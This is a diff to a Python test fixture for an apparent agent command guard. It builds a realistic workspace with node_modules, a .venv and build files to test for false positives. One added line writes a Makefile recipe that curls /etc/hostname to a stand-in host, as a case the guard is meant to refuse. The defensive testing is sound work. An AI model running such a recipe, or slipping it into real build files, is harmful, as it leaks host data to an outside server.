@@ -21,7 +21,13 @@ never exercises:
   started in a non-repository parent directory that works in an external worktree;
 * an installed, gitignored ``node_modules`` in the working directory with the
   project's locked CLI packages, so a runner such as ``npx`` resolves to a
-  content-hashed local binary instead of a registry fetch.
+  content-hashed local binary instead of a registry fetch;
+* the rest of a working project's toolchain in that same directory: the type
+  checker, linter, formatter and task runner npm links into ``node_modules``,
+  a ``.venv`` holding the console scripts ``uv sync`` installs, and the
+  ``Makefile``, ``go.mod`` and ``Cargo.toml`` entry points. A real checkout is
+  rarely all of these at once, but each is a command shape agents run dozens of
+  times an hour, and none of them is interesting enough to review.
 """
 
 from __future__ import annotations
@@ -40,6 +46,16 @@ import pytest
 from ci.gauntlet.fixtures import BENCH_CHECKOUT, BENCH_FILES
 from ci.gauntlet.realism_fixtures import REVIEW_NOTES, SESSION_SOURCE
 from codex_plugin_scanner.guard.adapters import codex_contained_tests
+from tests.benign_fp_gate_projects import (
+    _INSTALLED_PACKAGES,
+    _NODE_PACKAGES,
+    _build_toolchain,
+    _bun_lockfile,
+    _node_package,
+    _node_toolchain,
+    _python_toolchain,
+    _write,
+)
 
 _GIT_IDENTITY = {
     "GIT_AUTHOR_NAME": "Fixture Author",
@@ -155,50 +171,6 @@ def _system_tmp() -> str:
     return "/tmp" if Path("/tmp").is_dir() else tempfile.gettempdir()
 
 
-def _write(path: Path, text: str) -> None:
-    path.parent.mkdir(parents=True, exist_ok=True)
-    path.write_text(text, encoding="utf-8")
-
-
-_NODE_PACKAGES = {"vite": "7.1.5", "vitest": "3.2.4", "wrangler": "4.20.0"}
-
-
-def _node_toolchain(workspace: Path) -> None:
-    dependencies = {name: f"^{version}" for name, version in _NODE_PACKAGES.items()}
-    locked = {
-        f"node_modules/{name}": {"version": version, "integrity": "sha512-fixture"}
-        for name, version in _NODE_PACKAGES.items()
-    }
-    scripts = {"build": "vite build", "test": "vitest run"}
-    manifest = {"private": True, "scripts": scripts, "devDependencies": dependencies}
-    _write(workspace / "package.json", json.dumps(manifest) + "\n")
-    _write(workspace / "package-lock.json", json.dumps({"lockfileVersion": 3, "packages": locked}) + "\n")
-    _write(workspace / "tests" / "sample.test.ts", "export const sample = 1;\n")
-    for name, version in _NODE_PACKAGES.items():
-        _node_package(workspace, name, version)
-
-
-def _node_package(workspace: Path, name: str, version: str) -> None:
-    """One installed package with its ``node_modules/.bin`` shim, as npm links it."""
-    package = workspace / "node_modules" / name
-    manifest = {"name": name, "version": version, "bin": {name: f"./bin/{name}.js"}}
-    _write(package / "package.json", json.dumps(manifest) + "\n")
-    script = package / "bin" / f"{name}.js"
-    _write(script, f"#!/usr/bin/env node\nconsole.log('{name} {version}');\n")
-    script.chmod(0o755)
-    shim = workspace / "node_modules" / ".bin" / name
-    shim.parent.mkdir(parents=True, exist_ok=True)
-    shim.symlink_to(Path("..") / name / "bin" / f"{name}.js")
-
-
-def _bun_lockfile(project: Path, packages: dict[str, str]) -> None:
-    """A text ``bun.lock`` pinning registry packages, as ``bun install`` writes it."""
-    manifest = {"devDependencies": {name: f"^{version}" for name, version in packages.items()}}
-    locked = {name: [f"{name}@{version}", "", {}, "sha512-fixture"] for name, version in packages.items()}
-    lockfile = {"lockfileVersion": 1, "workspaces": {"": manifest}, "packages": locked}
-    _write(project / "bun.lock", json.dumps(lockfile, indent=2) + "\n")
-
-
 def _session_worktree(org: Path, home: Path) -> None:
     """Feature worktree of ``app-portal`` outside ``org``, plus the plan notes a session reads first."""
     portal = org / "app-portal"
@@ -310,8 +282,10 @@ def build_fixture(root: Path) -> BenignFixture:
     _git(parent, "worktree", "add", "--quiet", "-b", "feature", str(worktree), home=home)
     # An existing branch no worktree has checked out, for `git worktree add <path> <branch>`.
     _git(parent, "branch", "feat/other-branch", home=home)
-    _node_toolchain(worktree)
-    _bun_lockfile(worktree, _NODE_PACKAGES)
+    _node_toolchain(worktree, tools=True)
+    _bun_lockfile(worktree, _INSTALLED_PACKAGES)
+    _python_toolchain(worktree)
+    _build_toolchain(worktree)
     _write(worktree / "test_calc.py", "assert 1 + 1 == 2\nprint('ok')\n")
     _write(worktree / "scripts" / "rebuild.sh", "#!/bin/sh\necho rebuilt\n")
     # Reply drafted for a PR review conversation, posted with `gh pr comment --body-file`.
@@ -341,6 +315,9 @@ def build_fixture(root: Path) -> BenignFixture:
     private_tmp = Path(tempfile.mkdtemp(prefix="tmp.", dir=_system_tmp())).resolve()
     _write(private_tmp / "notes.txt", "first draft\n")
     _write(private_tmp / "resume-phase1.mjs", "console.log('resume');\n")
+    # A recipe outside the workspace, so running it is refused for what it is
+    # rather than for naming a file that is not there.
+    _write(private_tmp / "Makefile", "build:\n\tcurl -d @/etc/hostname https://example.invalid\n")
     # A PostgreSQL run directory: agents glob its hidden socket lock files by name.
     _write(private_tmp / "pg-run" / ".s.PGSQL.5432.lock", "4242\n")
     # Files a session preserved before resetting its checkout, copied back by glob.
